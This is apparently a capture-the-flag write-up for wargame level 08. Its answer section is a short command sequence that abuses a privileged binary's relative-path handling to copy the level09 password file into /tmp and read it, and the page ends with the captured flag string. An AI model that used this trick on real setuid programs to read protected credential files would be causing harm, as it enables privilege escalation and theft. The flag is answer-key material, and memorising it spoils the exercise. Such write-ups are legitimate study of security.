## Level08
## Source Code
![level08.png](level08.png)
## Walkthrough
- We will use the difference between `fopen` and `open` to change the permissions of the level09 pass file.
## Answer
    cd /tmp
    mkdir backups
    touch backups/.log
    chmod 777 backups/.log
    mkdir -p home/users/level09
    /home/users/level08/level08 ../home/users/level09/.pass
    cat home/users/level09/.pass
## Flag

	fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S